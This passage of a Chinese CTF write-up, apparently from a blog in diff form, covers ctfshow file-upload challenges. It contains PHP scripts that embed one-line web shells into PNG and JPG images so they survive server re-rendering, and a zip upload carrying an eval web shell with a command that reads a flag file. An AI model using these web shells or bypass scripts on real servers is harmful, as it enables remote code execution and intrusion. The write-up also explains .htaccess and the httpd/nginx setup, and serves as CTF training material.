+<h3 id="方法2：PHP脚本"><a href="#方法2：PHP脚本" class="headerlink" title="方法2：PHP脚本"></a>方法2：PHP脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;phppng.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>方法同上。</p>
+<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>JPG二次渲染。<a target="_blank" rel="noopener" href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">脚本地址</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">See also:</span></span><br><span class="line"><span class="comment">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?<span class="subst">$_GET</span>[0](<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">            <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                <span class="variable">$miniPayload</span> .</span><br><span class="line">                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                <span class="variable">$outStream</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里注意两点</p>
+<ol>
+<li><p>脚本提到需要先上传后用下载的图片运行脚本。</p>
+<blockquote>
+<ol>
+<li>Upload an arbitrary image via secured files upload script</li>
+<li>Save the processed image and launch:<br>jpg_payload.php &lt;jpg_name.jpg&gt;</li>
+</ol>
+</blockquote>
+</li>
+<li><p>Firefox下载下来是jpg；而Chrome下载下来是jfif。</p>
+</li>
+</ol>
+<p>用了3张图片复现失败，跳过。</p>
+<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>上传zip。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">lay-data</span>=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接上传一个空的zip，上传结束后看源码，有个download.php</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;upload/download.php?file=20a0c9db274373b897173b037d397902.zip&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>下载文件<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问该路由，zip被下载。修改zip内容为POST一句话木马（在这个情况下，使用GET一句话木马是没有用的，原理未知）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;0.zip&quot;</span><br><span class="line">Content-Type: application/x-zip-compressed</span><br><span class="line"></span><br><span class="line">PK</span><br><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓一个POST包，改包即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST //upload/download.php?file=7388d772b3dcfb0ac06666c97395a68e.zip</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cmd=system(&#x27;cat ../flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>直接看<a target="_blank" rel="noopener" href="https://blog.csdn.net/kracxi/article/details/122973479">wp</a>，提示这个是<code>.htaccess</code>的。</p>
+<p>其实题目提示了<code>httpd</code>，但是使用wappalyzer没有看出Apache的东西。</p>
+<h3 id="httpd、中间件"><a href="#httpd、中间件" class="headerlink" title="httpd、中间件"></a>httpd、中间件</h3><blockquote>
+<p>httpd，通常指的是Apache HTTP Server，可以被视为一种中间件。它是一种Web服务器软件，负责接收来自客户端（如Web浏览器）的HTTP请求，并向客户端发送HTTP响应，其中包含请求的网页内容或其他数据。作为中间件，httpd允许应用程序通过网络对外提供服务，处理客户端请求和服务器响应之间的通信，同时也提供安全性、负载均衡和会话管理等功能。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kracxi/article/details/122973479">wp</a>通过直接访问<code>/upload</code>路由看出是Apache的中间件。从而可以尝试<code>.htaccess</code></p>
+<blockquote>
+<p>.htaccess是一种在Apache HTTP Server中使用的配置文件，用于控制与其同一目录（或子目录）中的文件和目录的行为。.htaccess文件提供了一种方式，允许网站管理员对服务器全局配置的局部覆盖，而无需直接修改主服务器配置文件。使用.htaccess文件，可以实现多种功能，包括：</p>
+<ol>
+<li>URL重写和重定向：修改和重定向请求的URL，用于创建干净的URL或将旧页面重定向到新位置。</li>
+<li>访问控制：限制对特定文件或目录的访问，可以通过IP地址、域名或密码保护的方式进行。</li>
+<li>自定义错误页面：为不同的HTTP错误代码（如404未找到或500服务器内部错误）指定自定义错误页面。</li>
+<li>性能优化：通过压缩文件、缓存控制等手段优化网站的加载时间。</li>
+</ol>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">更多有关.htaccess在ctf中的运用</a></p>
+<h3 id="Apache-HTTP-Server-和-Nginx"><a href="#Apache-HTTP-Server-和-Nginx" class="headerlink" title="Apache HTTP Server 和 Nginx"></a>Apache HTTP Server 和 Nginx</h3><p>一个误区是“一个服务器使用了httpd就不能使用nginx了”，很明显是错的，不能因为某服务器使用了nginx，就认为其不使用httpd了。</p>
+<blockquote>
+<p>nginx 和 httpd 可以一起使用，各自扮演不同的角色，以利用各自的优势。一个常见的配置是使用 nginx 作为反向代理服务器，而使用 httpd（Apache）作为后端的Web服务器。在这种配置中，nginx 负责接收来自客户端的HTTP请求，并根据配置将请求转发到一个或多个后端的 httpd 服务器。</p>
+</blockquote>
+<blockquote>
